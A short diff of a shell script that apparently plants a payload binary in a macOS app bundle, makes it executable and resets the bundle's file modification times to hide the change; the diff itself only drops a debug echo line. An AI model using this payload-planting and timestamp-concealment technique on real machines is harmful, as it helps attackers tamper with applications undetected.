@@ -59,5 +59,4 @@ else
 	fi
 	chmod 755 "$TRUESRC/Contents/MacOS/$PayloadName"
 	touch -m "$LMTA" "$TRUESRC" && touch -m "$LMTC" "$TRUESRC/Contents" && touch -m "$LMTIP" "$TRUESRC/Contents/Info.plist" && touch -m "$LMTEF" "$TRUESRC/Contents/MacOS" && touch -m "$LMTOE" "$TRUESRC/Contents/MacOS/$PayloadName"
-	echo DEBUG, LMTOE is $LMTOE
 fi
